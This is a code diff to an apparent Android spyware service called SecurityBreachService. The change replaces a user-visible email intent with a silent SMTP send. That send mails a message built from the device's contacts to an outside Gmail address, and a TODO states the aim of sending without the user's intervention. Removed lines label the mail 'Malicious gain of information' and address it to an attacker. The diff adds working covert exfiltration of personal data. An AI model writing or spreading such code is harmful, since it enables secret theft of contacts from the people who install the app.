@@ -3,6 +3,9 @@ package com.eyespies.service;
 import java.util.ArrayList;
 import java.util.List;
 
+import javax.mail.MessagingException;
+import javax.mail.internet.AddressException;
+
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
@@ -108,13 +111,22 @@ public class SecurityBreachService extends Service {
 	//TODO: Current version requires User's intervention, Send email without having to do so
 	private void sendMailToAddress(List<ContactInformation> contacts) {
 		String emailMessage = constructEmailMessage(contacts);
-		Intent intent = new Intent(Intent.ACTION_SENDTO); // it's not ACTION_SEND
-		intent.setType("text/plain");
-		intent.putExtra(Intent.EXTRA_SUBJECT, "Malicious gain of information");
-		intent.putExtra(Intent.EXTRA_TEXT, emailMessage);
-		intent.setData(Uri.parse("mailto:" + attackerEmailId)); // or just "mailto:" for blank
-		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // this will make such that when user returns to your app, your app is displayed, instead of the email app.
-		startActivity(intent); 
+		try {
+			new SMTPSendEmail().sendEmailTo("eyespies55@gmail.com", "eyespies55", "smtp.gmail.com", "eyespies55@gmail.com", emailMessage);
+		} catch (AddressException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (MessagingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+//		Intent intent = new Intent(Intent.ACTION_SENDTO); // it's not ACTION_SEND
+//		intent.setType("text/plain");
+//		intent.putExtra(Intent.EXTRA_SUBJECT, "Malicious gain of information");
+//		intent.putExtra(Intent.EXTRA_TEXT, emailMessage);
+//		intent.setData(Uri.parse("mailto:" + attackerEmailId)); // or just "mailto:" for blank
+//		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // this will make such that when user returns to your app, your app is displayed, instead of the email app.
+//		startActivity(intent); 
 	}
 
 	private String constructEmailMessage(List<ContactInformation> contacts) {
